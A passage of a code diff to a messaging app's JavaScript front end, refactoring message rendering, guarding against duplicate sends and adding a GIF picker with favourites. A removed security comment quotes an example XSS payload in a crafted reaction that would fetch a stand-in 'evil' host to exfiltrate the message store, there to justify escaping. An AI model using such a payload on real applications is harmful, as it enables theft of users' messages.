+        nextMessage: allMsgs[absoluteMessageIndex + 1],
+      };
+      const key = threadMessageRenderKey(message, absoluteMessageIndex);
+      const signature = threadMessageRenderSignature(message, context);
+      items.push({
+        key,
+        signature,
+        create: () => buildThreadMessageNode(message, context),
+      });
+    });
+
+    drafts.forEach((draft, index) => {
+      const draftId = String(draft.DraftID || '');
+      const key = `draft:${draftId || `index-${index}`}`;
+      const signature = [
+        key,
+        draftDisplayBody(draft),
+        canSendActiveRoute ? 'sendable' : 'read-only',
+        canSendActiveRoute ? '' : routeUnavailableMessage('send drafts', activeConversation),
+      ].join('::');
+      items.push({
+        key,
+        signature,
+        create: () => buildThreadDraftNode(draft, canSendActiveRoute, draftTextareasToAutosize),
+      });
+    });
+    return items;
+  }
+
   function renderLoadedMessages({older = false, previousScrollTop = 0, previousScrollHeight = 0, stickToBottom = false, preserveAnchor = null} = {}) {
     const allMsgs = loadedMessages;
     const drafts = loadedDrafts;
@@ -8211,261 +9593,28 @@ body::after {
     lastThreadSignature = sig;
 
     captureDraftEdits();
-    $messagesArea.innerHTML = '';
-    const fragment = document.createDocumentFragment();
     const draftTextareasToAutosize = [];
-    let lastDate = 0;
+    const renderItems = buildThreadRenderItems(renderWindow, allMsgs, drafts, showMixedSourceChips, canSendActiveRoute, messagesByID, draftTextareasToAutosize);
+    reconcileKeyedChildren($messagesArea, renderItems);
+    draftTextareasToAutosize.forEach(autosizeDraftTextarea);
 
-    msgs.forEach((m, mi) => {
-        const absoluteMessageIndex = renderWindow.start + mi;
-        // Date divider
-        if (!isSameDay(m.TimestampMS, lastDate)) {
-          const divider = document.createElement('div');
-          divider.className = 'date-divider';
-          divider.textContent = formatDateDivider(m.TimestampMS);
-          fragment.appendChild(divider);
-          lastDate = m.TimestampMS;
-        }
-
-        // System/tombstone messages (protocol switches, chat creation)
-        if ((m.Status || '').startsWith('TOMBSTONE_')) {
-          const sysEl = document.createElement('div');
-          sysEl.className = 'system-msg';
-          let sysText = m.Body || '';
-          if (m.Status.includes('RCS')) {
-            sysText = '🔒 ' + sysText;
-          } else if (m.Status.includes('TEXT') || m.Status.includes('SMS')) {
-            sysText = '💬 ' + sysText;
-          }
-          sysEl.textContent = sysText;
-          fragment.appendChild(sysEl);
-          return;
-        }
-
-        const el = document.createElement('div');
-        el.className = 'msg ' + (m.IsFromMe ? 'sent' : 'received');
-
-        let html = '';
-
-        // Reply banner
-        if (m.ReplyToID) {
-          const original = messagesByID.get(String(m.ReplyToID || ''));
-          const origName = original ? (original.SenderName || 'You') : '';
-          const origBody = original ? (original.Body || 'Media') : 'Original message';
-          const truncBody = origBody.length > 60 ? origBody.substring(0, 60) + '\u2026' : origBody;
-          html += `<div class="msg-reply-preview" data-reply-id="${escapeHtml(m.ReplyToID)}" onclick="scrollToMessage('${escapeHtml(m.ReplyToID)}')"><span class="reply-author">${escapeHtml(origName)}</span><span class="reply-body">${escapeHtml(truncBody)}</span></div>`;
-        }
-
-        if (activeConvoIsGroup && !m.IsFromMe && m.SenderName) {
-          html += `<div class="msg-sender" style="color:${avatarColor(m.SenderName)}">${escapeHtml(m.SenderName)}</div>`;
-        }
-        if (showMixedSourceChips) {
-          html += `<div class="msg-source-row">${platformBadgeHTML(sourcePlatformOf(m))}</div>`;
-        }
-        if (m.MediaID || m.MimeType) {
-          const mimeType = (m.MimeType || '').toLowerCase();
-          const isImage = mimeType.startsWith('image/');
-          const isAudio = mimeType.startsWith('audio/');
-          const isVideo = mimeType.startsWith('video/');
-          const hasMediaID = !!m.MediaID;
-          const mediaSrc = `/api/media/${encodeURIComponent(m.MessageID)}`;
-          const audioLabel = (m.Body === '[Voice note]' || m.Body === '[Audio]' || !m.Body) ? (m.Body === '[Voice note]' ? 'Voice note' : 'Audio message') : '';
-          const transcript = m.Transcript || m.transcript || '';
-          const transcriptModel = m.TranscriptModel || m.transcript_model || '';
-
-          if (hasMediaID && isImage) {
-            html += `<div class="msg-media">`;
-            html += `<div class="msg-media-loading" data-msg-id="${escapeHtml(m.MessageID)}" data-kind="image"><div class="spinner"></div><span class="msg-media-loading-text">Fetching image...</span></div>`;
-            html += `<img src="${mediaSrc}" alt="Image" loading="lazy" decoding="async" onload="handleMediaLoad(this)" onerror="handleMediaError(this, 'image')" onclick="showFullscreen(this.src,'image')">`;
-            html += `</div>`;
-          } else if (hasMediaID && isAudio) {
-            html += `<div class="msg-media">`;
-            if (audioLabel) {
-              html += `<div class="msg-audio-label">${escapeHtml(audioLabel)}</div>`;
-            }
-            html += `<audio src="${mediaSrc}" controls preload="metadata"></audio>`;
-            if (transcript) {
-              html += `<div class="msg-transcript" title="${escapeHtml(transcriptModel || 'auto-transcribed')}">${escapeHtml(transcript)}</div>`;
-            }
-            html += `</div>`;
-          } else if (hasMediaID && isVideo) {
-            html += `<div class="msg-media">`;
-            html += `<div class="msg-media-loading" data-msg-id="${escapeHtml(m.MessageID)}" data-kind="video"><div class="spinner"></div><span class="msg-media-loading-text">Fetching video...</span></div>`;
-            html += `<video src="${mediaSrc}" preload="none" controls playsinline style="display:none" onloadeddata="this.style.display='block';handleMediaLoad(this)" onerror="handleMediaError(this, 'video')" onclick="event.stopPropagation()"></video>`;
-            html += `</div>`;
-          } else if (!hasMediaID && (isImage || isAudio || isVideo)) {
-            const icon = isImage ? '\uD83D\uDDBC\uFE0F' : (isAudio ? '\uD83C\uDFA4' : '\uD83C\uDFA5');
-            const label = isImage ? 'Image' : (isAudio ? 'Audio' : 'Video');
-            html += `<div style="padding:12px;background:var(--bg-tertiary, #f0f0f0);border-radius:8px;text-align:center;color:var(--text-muted, #999);font-size:13px">${icon} ${label} from phone</div>`;
-          } else if (hasMediaID) {
-            html += `<div style="font-size:13px;color:var(--text-secondary);padding:6px 0">Attachment: ${escapeHtml(m.MimeType || 'file')}</div>`;
-          } else {
-            html += `<div style="font-size:13px;color:var(--text-muted);padding:6px 0">Attachment (${escapeHtml(m.MimeType || 'file')})</div>`;
-          }
-        }
-        const previewURL = m.Body ? extractMessageURLs(m.Body)[0] : '';
-        const shouldHideGenericMediaBody = !!m.MediaID && (
-          m.Body === '[Photo]' ||
-          m.Body === '[Video]' ||
-          m.Body === '[Audio]' ||
-          m.Body === '[Voice note]' ||
-          m.Body === '[Sticker]'
-        );
-        if (m.Body && !shouldHideGenericMediaBody) {
-          html += `<div class="msg-body">${linkifyMessageBody(m.Body)}</div>`;
-          if (previewURL) {
-            html += `<div class="msg-link-preview-shell" data-preview-url="${escapeHtml(previewURL)}"></div>`;
-          }
-        }
-        if (!m.Body && !m.MediaID) {
-          html += `<div class="msg-body" style="color:var(--text-muted);font-style:italic">Empty message</div>`;
-        }
-
-        // Reactions
-        //
-        // SECURITY: r.emoji is attacker-controlled. WhatsApp and Signal both
-        // accept arbitrary strings as reaction "text" at the protocol level —
-        // whatsmeow's reaction.GetText() and signal-cli's reaction.Emoji are
-        // raw bytes, not validated graphemes. A crafted reaction like
-        //   <img src=x onerror="fetch('https://evil/'+btoa(...))">
-        // rendered via innerHTML without escaping would fire on paint and
-        // exfiltrate the entire local message store (same-origin access to
-        // /api/messages). Always escape.
-        if (m.Reactions) {
-          try {
-            const reactions = JSON.parse(m.Reactions);
-            if (reactions.length > 0) {
-              html += '<div class="msg-reactions">';
-              reactions.forEach(r => {
-                const count = Number(r.count) || 0;
-                const emoji = escapeHtml(r.emoji || '');
-                const tip = escapeHtml(reactionTooltip(r, activeConversation));
-                html += `<span class="reaction-pill" title="${tip}">${emoji}<span class="reaction-count">${count > 1 ? count : ''}</span></span>`;
-              });
-              html += '</div>';
-            }
-          } catch(e) {}
-        }
-
-        html += `<div class="msg-time">${formatMessageTime(m.TimestampMS)}${m.IsFromMe ? formatStatusIndicator(m.Status) : ''}</div>`;
-
-        // Hover action bar (Google Messages style)
-        html += `<div class="msg-actions">`;
-        html += `<button class="action-react" title="React"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M8 14s1.5 2 4 2 4-2 4-2"/><line x1="9" y1="9" x2="9.01" y2="9"/><line x1="15" y1="9" x2="15.01" y2="9"/></svg></button>`;
-        html += `<button class="action-reply" title="Reply"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 17 4 12 9 7"/><path d="M20 18v-2a4 4 0 0 0-4-4H4"/></svg></button>`;
-        html += `</div>`;
-
-        // Emoji picker (hidden, toggled by react button). MessageID is
-        // server-assigned (e.g. "whatsapp:<stanzaID>") but still goes through
-        // escapeHtml defensively since it's interpolated into both attribute
-        // values and onclick JS string literals.
-        const safeMsgId = escapeHtml(m.MessageID);
-        html += `<div class="emoji-picker" id="emoji-${safeMsgId}">`;
-        QUICK_EMOJIS.forEach(e => {
-          const safeEmoji = escapeHtml(e);
-          html += `<button onclick="sendReaction('${safeMsgId}','${safeEmoji}')">${safeEmoji}</button>`;
-        });
-        html += `<button class="emoji-plus" data-msg-id="${safeMsgId}" onclick="toggleFullEmojiPanel(event, '${safeMsgId}')">+</button>`;
-        html += '</div>';
-
-        // Full emoji panel is hydrated on demand instead of for every message upfront.
-        html += `<div class="emoji-full-panel" id="emoji-full-${safeMsgId}"></div>`;
-
-        el.innerHTML = html;
-        el.dataset.msgId = m.MessageID;
-
-        // Action bar: React button → toggle emoji picker
-        el.querySelector('.action-react').addEventListener('click', (e) => {
-          e.stopPropagation();
-          document.querySelectorAll('.emoji-picker.show').forEach(p => p.classList.remove('show'));
-          const picker = document.getElementById('emoji-' + m.MessageID);
-          if (picker) picker.classList.toggle('show');
-        });
-
-        // Action bar: Reply button
-        el.querySelector('.action-reply').addEventListener('click', (e) => {
-          e.stopPropagation();
-          setReplyTo(m);
-        });
-
-        el.addEventListener('contextmenu', (event) => {
-          openContextMenu(event, messageContextMenuItems(m), { type: 'message', message: m });
-        });
-
-        // In group chats, wrap received messages with an avatar
-        if (activeConvoIsGroup && !m.IsFromMe && m.SenderName) {
-          // Show avatar only for the last message in a consecutive run from the same sender
-          const nextMsg = allMsgs[absoluteMessageIndex + 1];
-          const isLastFromSender = !nextMsg || nextMsg.IsFromMe || nextMsg.SenderName !== m.SenderName ||
-            (nextMsg.Status || '').startsWith('TOMBSTONE_') || !isSameDay(m.TimestampMS, nextMsg.TimestampMS);
-
-          const row = document.createElement('div');
-          row.className = 'msg-row received';
-          const avatarDiv = document.createElement('div');
-          avatarDiv.className = 'msg-avatar' + (isLastFromSender ? '' : ' avatar-hidden');
-          const avatarRefs = senderAvatarRefs(m);
-          renderAvatarElement(avatarDiv, {
-            name: m.SenderName,
-            numbers: uniqueAvatarNumbers([m.SenderNumber]),
-            whatsAppConversationID: senderAvatarWhatsAppConversationID(m),
-            avatarSource: avatarRefs.source,
-            participantIDs: avatarRefs.participantIDs,
-            contactIDs: avatarRefs.contactIDs,
-            text: initials(m.SenderName).charAt(0),
-            background: avatarColor(m.SenderName),
-          });
-          row.appendChild(avatarDiv);
-          row.appendChild(el);
-          fragment.appendChild(row);
-        } else {
-          fragment.appendChild(el);
-        }
-      });
-
-      // Load drafts for this conversation
-      drafts.forEach(draft => {
-        const draftEl = document.createElement('div');
-        draftEl.className = 'draft-banner';
-        draftEl.dataset.draftId = String(draft.DraftID || '');
-        draftEl.innerHTML = `
-          <div class="draft-label">AI Draft</div>
-          <textarea class="draft-text" rows="2"></textarea>
-          <div class="draft-actions">
-            <button class="draft-discard-btn" onclick="discardDraft('${escapeHtml(draft.DraftID)}')">Discard</button>
-            <button class="draft-send-btn" onclick="sendDraft('${escapeHtml(draft.DraftID)}', this)" ${canSendActiveRoute ? '' : `disabled title="${escapeHtml(routeUnavailableMessage('send drafts', activeConversation))}"`}>Send</button>
-          </div>
-        `;
-        fragment.appendChild(draftEl);
-        const ta = draftEl.querySelector('textarea');
-        ta.value = draftDisplayBody(draft);
-        draftTextareasToAutosize.push(ta);
-        ta.addEventListener('input', () => {
-          draftEdits.set(String(draft.DraftID || ''), ta.value);
-          autosizeDraftTextarea(ta);
-        });
-      });
-
-      $messagesArea.appendChild(fragment);
-      draftTextareasToAutosize.forEach(autosizeDraftTextarea);
-
-      // Update protocol indicator in header from most recent tombstone
-      // msgs are in chronological order (oldest first), so findLast gets the latest
-      const lastTombstone = allMsgs.findLast(m => (m.Status || '').startsWith('TOMBSTONE_'));
-      let protocolDetail = '';
-      if (lastTombstone) {
-        if (lastTombstone.Status.includes('RCS')) {
-          protocolDetail = 'RCS';
-        } else if (lastTombstone.Status.includes('TEXT') || lastTombstone.Status.includes('SMS')) {
-          protocolDetail = 'Text';
-        }
+    // Update protocol indicator in header from most recent tombstone.
+    const lastTombstone = allMsgs.findLast(m => (m.Status || '').startsWith('TOMBSTONE_'));
+    let protocolDetail = '';
+    if (lastTombstone) {
+      if (lastTombstone.Status.includes('RCS')) {
+        protocolDetail = 'RCS';
+      } else if (lastTombstone.Status.includes('TEXT') || lastTombstone.Status.includes('SMS')) {
+        protocolDetail = 'Text';
       }
-      refreshConversationChrome(protocolDetail);
-      hydrateLinkPreviews();
-      hydrateNativeAvatars($messagesArea);
-      hydrateMediaElements($messagesArea);
-      scheduleMediaLoaderLabels($messagesArea);
-      observeThreadContentResize();
-      observeThreadViewportResize();
+    }
+    refreshConversationChrome(protocolDetail);
+    hydrateLinkPreviews();
+    hydrateNativeAvatars($messagesArea);
+    hydrateMediaElements($messagesArea);
+    scheduleMediaLoaderLabels($messagesArea);
+    observeThreadContentResize();
+    observeThreadViewportResize();
 
     if (preserveAnchor && restoreThreadViewportAnchor(preserveAnchor)) {
       syncThreadBottomFollowState();
@@ -8805,6 +9954,9 @@ body::after {
 
   // ─── Send Message ───
   async function sendMessage() {
+    if (composeSendInFlight) {
+      return;
+    }
     if (!activeConversation) {
       return;
     }
@@ -8835,10 +9987,12 @@ body::after {
       || (hasMedia && activePlatform === 'signal');
     if ((!text && !hasMedia) || !sendConvoId) return;
 
+    composeSendInFlight = true;
     clearThreadFeedback();
     $composeInput.value = '';
     composeTextByConversation.delete(sendConvoId);
     $sendBtn.disabled = true;
+    $attachBtn.disabled = true;
     autoResize();
 
     // Optimistic UI: show message immediately before server round-trip
@@ -8902,6 +10056,8 @@ body::after {
       showThreadFeedback(err.message || 'Failed to send message', 'send');
       console.error('Failed to send:', err);
     } finally {
+      composeSendInFlight = false;
+      refreshComposeRouteUI();
       autoResize();
     }
   }
@@ -8932,6 +10088,7 @@ body::after {
     const hasText = !!$composeInput.value.trim();
     const hasMedia = !!pendingFile;
     $sendBtn.disabled = !activeConversation
+      || composeSendInFlight
       || (!hasText && !hasMedia)
       || browserIsOffline()
       || (hasText && !conversationSupportsOutbound(activeConversation))
@@ -9138,13 +10295,14 @@ body::after {
     if ($composeEmojiBtn) $composeEmojiBtn.setAttribute('aria-expanded', 'false');
   }
 
-  function toggleComposeEmojiPanel() {
-    if (!$composeEmojiPanel || !$composeEmojiBtn) return;
-    buildComposeEmojiPanel();
-    const willOpen = !$composeEmojiPanel.classList.contains('show');
-    document.querySelectorAll('.emoji-picker.show').forEach(p => p.classList.remove('show'));
-    document.querySelectorAll('.emoji-full-panel.show').forEach(p => {
-      if (p !== $composeEmojiPanel) p.classList.remove('show');
+	  function toggleComposeEmojiPanel() {
+	    if (!$composeEmojiPanel || !$composeEmojiBtn) return;
+	    buildComposeEmojiPanel();
+	    const willOpen = !$composeEmojiPanel.classList.contains('show');
+	    closeComposeGifPanel();
+	    document.querySelectorAll('.emoji-picker.show').forEach(p => p.classList.remove('show'));
+	    document.querySelectorAll('.emoji-full-panel.show').forEach(p => {
+	      if (p !== $composeEmojiPanel) p.classList.remove('show');
     });
     $composeEmojiPanel.classList.toggle('show', willOpen);
     $composeEmojiBtn.setAttribute('aria-expanded', willOpen ? 'true' : 'false');
@@ -9171,14 +10329,414 @@ body::after {
     $composeInput.focus();
   }
 
-  if ($composeEmojiBtn) {
-    $composeEmojiBtn.addEventListener('click', (event) => {
-      event.stopPropagation();
-      toggleComposeEmojiPanel();
-    });
-  }
+	  if ($composeEmojiBtn) {
+	    $composeEmojiBtn.addEventListener('click', (event) => {
+	      event.stopPropagation();
+	      toggleComposeEmojiPanel();
+	    });
+	  }
 
-  if ($threadSearchInput) {
+	  const GIF_SEARCH_DEBOUNCE_MS = 500;
+	  const GIF_PAGE_SIZE = 32;
+	  const GIF_FAVORITES_STORAGE_KEY = 'openmessage.gifFavorites.v1';
+	  const GIF_FAVORITES_LIMIT = 72;
+	  let gifSearchTimeout = null;
+	  let gifSearchRequestID = 0;
+	  let gifSending = false;
+	  let gifLoading = false;
+	  let gifQuery = '';
+	  let gifPage = 0;
+	  let gifHasMore = true;
+	  let gifResults = [];
+	  let gifFavorites = loadGifFavorites();
+
+	  function normalizeGifResult(result) {
+	    if (!result || !result.url || !result.preview_url) return null;
+	    return {
+	      id: String(result.id || ''),
+	      title: String(result.title || 'GIF'),
+	      preview_url: String(result.preview_url || ''),
+	      url: String(result.url || ''),
+	      mime_type: String(result.mime_type || 'image/gif'),
+	      width: Number(result.width || 0),
+	      height: Number(result.height || 0),
+	    };
+	  }
+
+	  function gifKey(result) {
+	    return String(result && result.url || '').trim();
+	  }
+
+	  function loadGifFavorites() {
+	    try {
+	      const raw = window.localStorage ? window.localStorage.getItem(GIF_FAVORITES_STORAGE_KEY) : '';
+	      const parsed = raw ? JSON.parse(raw) : [];
+	      if (!Array.isArray(parsed)) return [];
+	      return parsed.map(normalizeGifResult).filter(Boolean).slice(0, GIF_FAVORITES_LIMIT);
+	    } catch {
+	      return [];
+	    }
+	  }
+
+	  function saveGifFavorites() {
+	    try {
+	      if (window.localStorage) {
+	        window.localStorage.setItem(GIF_FAVORITES_STORAGE_KEY, JSON.stringify(gifFavorites.slice(0, GIF_FAVORITES_LIMIT)));
+	      }
+	    } catch {}
+	  }
+
+	  function isFavoriteGif(result) {
+	    const key = gifKey(result);
+	    return !!key && gifFavorites.some(item => gifKey(item) === key);
+	  }
+
+	  function gifFavoriteIconHTML(active) {
+	    return `<svg viewBox="0 0 24 24" fill="${active ? 'currentColor' : 'none'}" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>`;
+	  }
+
+	  function updateGifFavoriteButtons(root = $composeGifPanel) {
+	    if (!root) return;
+	    root.querySelectorAll('.gif-favorite-toggle').forEach(btn => {
+	      const active = gifFavorites.some(item => gifKey(item) === btn.dataset.gifUrl);
+	      btn.classList.toggle('active', active);
+	      btn.setAttribute('aria-pressed', active ? 'true' : 'false');
+	      btn.title = active ? 'Remove from favorite GIFs' : 'Add to favorite GIFs';
+	      btn.setAttribute('aria-label', btn.title);
+	      btn.innerHTML = gifFavoriteIconHTML(active);
+	    });
+	  }
+
+	  function toggleGifFavorite(result) {
+	    const normalized = normalizeGifResult(result);
+	    if (!normalized) return;
+	    const key = gifKey(normalized);
+	    const existing = gifFavorites.findIndex(item => gifKey(item) === key);
+	    if (existing >= 0) {
+	      gifFavorites.splice(existing, 1);
+	    } else {
+	      gifFavorites.unshift(normalized);
+	      gifFavorites = gifFavorites.slice(0, GIF_FAVORITES_LIMIT);
+	    }
+	    saveGifFavorites();
+	    renderGifFavorites();
+	    updateGifFavoriteButtons();
+	  }
+
+	  function buildComposeGifPanel() {
+	    if (!$composeGifPanel || $composeGifPanel.dataset.hydrated === 'true') return;
+	    $composeGifPanel.innerHTML = `
+	      <div class="gif-search">
+	        <input type="text" id="compose-gif-search" placeholder="Search GIFs..." aria-label="Search GIFs" autocomplete="off">
+	      </div>
+	      <div class="gif-results-scroll" id="compose-gif-scroll">
+	        <div class="gif-favorites" id="compose-gif-favorites" hidden>
+	          <div class="gif-section-label">Favorites</div>
+	          <div class="gif-favorites-grid" id="compose-gif-favorites-grid"></div>
+	        </div>
+	        <div class="gif-status" id="compose-gif-status"></div>
+	        <div class="gif-grid" id="compose-gif-grid" aria-live="polite"></div>
+	        <div class="gif-load-status" id="compose-gif-load-status" hidden></div>
+	      </div>
+	    `;
+	    $composeGifPanel.dataset.hydrated = 'true';
+	    const search = document.getElementById('compose-gif-search');
+	    if (search) {
+	      search.addEventListener('input', () => scheduleComposeGifSearch(search.value));
+	    }
+	    const scroller = document.getElementById('compose-gif-scroll');
+	    if (scroller) {
+	      scroller.addEventListener('scroll', maybeLoadMoreComposeGifs);
+	    }
+	    renderGifFavorites();
+	  }
+
+	  function scheduleComposeGifSearch(query) {
+	    if (gifSearchTimeout) clearTimeout(gifSearchTimeout);
+	    gifSearchTimeout = setTimeout(() => {
+	      gifSearchTimeout = null;
+	      loadComposeGifs(query).catch(err => console.error('GIF search failed:', err));
+	    }, GIF_SEARCH_DEBOUNCE_MS);
+	  }
+
+	  function closeComposeGifPanel() {
+	    if (!$composeGifPanel) return;
+	    if (gifSearchTimeout) {
+	      clearTimeout(gifSearchTimeout);
+	      gifSearchTimeout = null;
+	    }
+	    $composeGifPanel.classList.remove('show');
+	    if ($composeGifBtn) $composeGifBtn.setAttribute('aria-expanded', 'false');
+	  }
+
+	  function toggleComposeGifPanel() {
+	    if (!$composeGifPanel || !$composeGifBtn) return;
+	    if (!conversationSupportsMediaOutbound(activeConversation)) {
+	      showThreadFeedback('GIFs are unavailable on this route right now.');
+	      return;
+	    }
+	    buildComposeGifPanel();
+	    const willOpen = !$composeGifPanel.classList.contains('show');
+	    closeComposeEmojiPanel();
+	    document.querySelectorAll('.emoji-picker.show').forEach(p => p.classList.remove('show'));
+	    document.querySelectorAll('.emoji-full-panel.show').forEach(p => p.classList.remove('show'));
+	    $composeGifPanel.classList.toggle('show', willOpen);
+	    $composeGifBtn.setAttribute('aria-expanded', willOpen ? 'true' : 'false');
+	    if (willOpen) {
+	      renderGifFavorites();
+	      const input = document.getElementById('compose-gif-search');
+	      if (input) input.focus();
+	      if ($composeGifPanel.dataset.loaded !== 'true') {
+	        loadComposeGifs('').catch(err => console.error('GIF search failed:', err));
+	      }
+	    }
+	  }
+
+	  function maybeLoadMoreComposeGifs() {
+	    const scroller = document.getElementById('compose-gif-scroll');
+	    if (!scroller || gifLoading || !gifHasMore) return;
+	    const remaining = scroller.scrollHeight - scroller.scrollTop - scroller.clientHeight;
+	    if (remaining <= 160) {
+	      loadComposeGifs(gifQuery, {append: true}).catch(err => console.error('GIF search failed:', err));
+	    }
+	  }
+
+	  async function loadComposeGifs(query, options = {}) {
+	    if (!$composeGifPanel || gifLoading) return;
+	    const append = !!options.append;
+	    const trimmed = String(query || '').trim();
+	    if (append && (!gifHasMore || trimmed !== gifQuery)) return;
+
+	    const requestID = ++gifSearchRequestID;
+	    const page = append ? gifPage + 1 : 1;
+	    const status = document.getElementById('compose-gif-status');
+	    const grid = document.getElementById('compose-gif-grid');
+	    const loadStatus = document.getElementById('compose-gif-load-status');
+	    if (!status || !grid) return;
+
+	    gifLoading = true;
+	    if (!append) {
+	      gifQuery = trimmed;
+	      gifPage = 0;
+	      gifHasMore = true;
+	      gifResults = [];
+	      grid.innerHTML = '';
+	      status.hidden = false;
+	      status.textContent = 'Loading GIFs...';
+	      const scroller = document.getElementById('compose-gif-scroll');
+	      if (scroller) scroller.scrollTop = 0;
+	    } else if (loadStatus) {
+	      loadStatus.hidden = false;
+	      loadStatus.textContent = 'Loading more GIFs...';
+	    }
+
+	    const endpoint = trimmed
+	      ? `/api/gifs?q=${encodeURIComponent(trimmed)}&limit=${GIF_PAGE_SIZE}&page=${page}`
+	      : `/api/gifs/trending?limit=${GIF_PAGE_SIZE}&page=${page}`;
+	    try {
+	      const payload = await fetchJSON(endpoint);
+	      if (requestID !== gifSearchRequestID) return;
+	      const incoming = (Array.isArray(payload) ? payload : (payload.results || []))
+	        .map(normalizeGifResult)
+	        .filter(Boolean);
+	      const existing = new Set(gifResults.map(gifKey));
+	      let added = 0;
+	      for (const result of incoming) {
+	        const key = gifKey(result);
+	        if (!key || existing.has(key)) continue;
+	        existing.add(key);
+	        gifResults.push(result);
+	        added += 1;
+	      }
+	      gifPage = page;
+	      gifHasMore = added > 0 && (payload && payload.has_more !== false) && incoming.length >= GIF_PAGE_SIZE;
+	      renderComposeGifs(gifResults);
+	      $composeGifPanel.dataset.loaded = 'true';
+	      requestAnimationFrame(() => {
+	        const scroller = document.getElementById('compose-gif-scroll');
+	        if (gifHasMore && scroller && scroller.scrollHeight <= scroller.clientHeight + 8) {
+	          maybeLoadMoreComposeGifs();
+	        }
+	      });
+	    } catch (err) {
+	      if (requestID !== gifSearchRequestID) return;
+	      status.hidden = false;
+	      status.textContent = userFacingErrorMessage(err) || 'GIF search failed.';
+	      throw err;
+	    } finally {
+	      if (requestID === gifSearchRequestID) {
+	        gifLoading = false;
+	        if (loadStatus) loadStatus.hidden = true;
+	      }
+	    }
+	  }
+
+	  function renderGifTile(result) {
+	    const normalized = normalizeGifResult(result);
+	    if (!normalized) return null;
+	    const tile = document.createElement('div');
+	    tile.className = 'gif-tile';
+	    tile.tabIndex = 0;
+	    tile.setAttribute('role', 'button');
+	    tile.title = normalized.title;
+	    tile.setAttribute('aria-label', normalized.title);
+
+	    const img = document.createElement('img');
+	    img.src = normalized.preview_url;
+	    img.alt = normalized.title;
+	    img.loading = 'lazy';
+	    tile.appendChild(img);
+
+	    const favorite = document.createElement('button');
+	    favorite.type = 'button';
+	    favorite.className = 'gif-favorite-toggle';
+	    favorite.dataset.gifUrl = normalized.url;
+	    favorite.addEventListener('click', (event) => {
+	      event.preventDefault();
+	      event.stopPropagation();
+	      toggleGifFavorite(normalized);
+	    });
+	    tile.appendChild(favorite);
+	    updateGifFavoriteButtons(tile);
+
+	    const send = () => {
+	      sendComposeGif(normalized).catch(err => console.error('Failed to send GIF:', err));
+	    };
+	    tile.addEventListener('click', send);
+	    tile.addEventListener('keydown', (event) => {
+	      if (event.key === 'Enter' || event.key === ' ') {
+	        event.preventDefault();
+	        send();
+	      }
+	    });
+	    return tile;
+	  }
+
+	  function renderGifFavorites() {
+	    const section = document.getElementById('compose-gif-favorites');
+	    const grid = document.getElementById('compose-gif-favorites-grid');
+	    if (!section || !grid) return;
+	    grid.innerHTML = '';
+	    if (!gifFavorites.length) {
+	      section.hidden = true;
+	      return;
+	    }
+	    section.hidden = false;
+	    gifFavorites.forEach(result => {
+	      const tile = renderGifTile(result);
+	      if (tile) grid.appendChild(tile);
+	    });
+	  }
+
+	  function renderComposeGifs(results) {
+	    const status = document.getElementById('compose-gif-status');
+	    const grid = document.getElementById('compose-gif-grid');
+	    const loadStatus = document.getElementById('compose-gif-load-status');
+	    if (!status || !grid) return;
+	    grid.innerHTML = '';
+	    if (!Array.isArray(results) || results.length === 0) {
+	      status.hidden = false;
+	      status.textContent = 'No GIFs found.';
+	      if (loadStatus) loadStatus.hidden = true;
+	      return;
+	    }
+	    status.hidden = true;
+	    results.forEach(result => {
+	      const tile = renderGifTile(result);
+	      if (tile) grid.appendChild(tile);
+	    });
+	    if (!grid.children.length) {
+	      status.hidden = false;
+	      status.textContent = 'No GIFs found.';
+	    }
+	    if (loadStatus) {
+	      loadStatus.hidden = !gifHasMore;
+	      loadStatus.textContent = gifHasMore ? 'Scroll for more GIFs' : '';
+	    }
+	  }
+
+	  async function sendComposeGif(result) {
+	    if (gifSending) return;
+	    if (!activeConversation || !activeConvoId) return;
+	    if (browserIsOffline()) {
+	      showThreadFeedback(offlineFeedbackMessage('send'), 'send');
+	      return;
+	    }
+	    if (!conversationSupportsMediaOutbound(activeConversation)) {
+	      showThreadFeedback('GIFs are unavailable on this route right now.');
+	      return;
+	    }
+	    if (pendingFile) {
+	      showThreadFeedback('Send or remove the current attachment before choosing a GIF.');
+	      return;
+	    }
+
+	    const sendConvoId = activeConvoId;
+	    const sendConversation = activeConversation;
+	    const activePlatform = sourcePlatformOf(sendConversation);
+	    const text = $composeInput.value.trim();
+	    const originalText = $composeInput.value;
+	    const supportsMediaCaption = activePlatform === 'whatsapp' || activePlatform === 'signal';
+
+	    clearThreadFeedback();
+	    gifSending = true;
+	    $composeInput.value = '';
+	    composeTextByConversation.delete(sendConvoId);
+	    autoResize();
+
+	    try {
+	      const payload = {
+	        conversation_id: sendConvoId,
+	        url: result.url,
+	      };
+	      if (supportsMediaCaption && text) payload.caption = text;
+	      if (supportsMediaCaption && replyToMsg) payload.reply_to_id = replyToMsg.MessageID;
+	      await postJSON('/api/send-gif', payload);
+
+	      if (text && !supportsMediaCaption) {
+	        const textPayload = {
+	          conversation_id: sendConvoId,
+	          message: text,
+	        };
+	        if (replyToMsg) textPayload.reply_to_id = replyToMsg.MessageID;
+	        await postJSON('/api/send', textPayload);
+	      }
+
+	      closeComposeGifPanel();
+	      clearReply();
+	      if (activeConvoId === sendConvoId) {
+	        if (threadSearchMode === 'centered') {
+	          clearThreadSearchUI();
+	          resetLoadedThreadState();
+	          await loadMessages(sendConvoId, {reset: true, forceBottom: true});
+	        } else {
+	          await loadMessages(sendConvoId, {poll: true, forceBottom: true});
+	        }
+	      }
+	      await loadConversations();
+	    } catch (err) {
+	      if (text) {
+	        if (activeConvoId === sendConvoId) {
+	          $composeInput.value = originalText;
+	        }
+	        rememberComposeText(sendConvoId, originalText);
+	      }
+	      showThreadFeedback(err.message || 'Failed to send GIF', 'send');
+	      throw err;
+	    } finally {
+	      gifSending = false;
+	      autoResize();
+	    }
+	  }
+
+	  if ($composeGifBtn) {
+	    $composeGifBtn.addEventListener('click', (event) => {
+	      event.stopPropagation();
+	      toggleComposeGifPanel();
+	    });
+	  }
+
+	  if ($threadSearchInput) {
